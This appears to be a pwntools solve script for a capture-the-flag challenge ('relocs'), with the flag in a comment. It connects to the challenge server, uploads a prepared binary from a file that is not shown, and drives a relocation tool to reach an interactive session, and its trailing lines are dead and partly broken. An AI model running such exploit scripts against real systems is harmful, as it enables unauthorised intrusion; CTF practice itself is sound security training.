#ifctf{technically_now_we_can_go_flex_that_we_have_a_0day_on_linux_right?}

from pwn import *

#r = process("./relocs")

r = remote("challs.ifctf.fibonhack.it", 10016)

r.recvline()
r.recvline()

r.sendline("upload /tmp/lmao")
r.send(open("working", "rb").read())

r.sendline("help")
r.sendline("print_flag --abs-syms --abs-relocs --reloc-info --text --realmode")
r.sendline("print_flag --abs-syms --abs-relocs --reloc-info --text --realmode")
r.sendline("relocs /tmp/lmao --abs-syms")

r.interactive()

def sl(data):
    r.recv(1024)
    r.sendline(data)

# help
sl("upload /tmp/lmao")
sl()

# print all
# print all
# relocs

r.interactive()
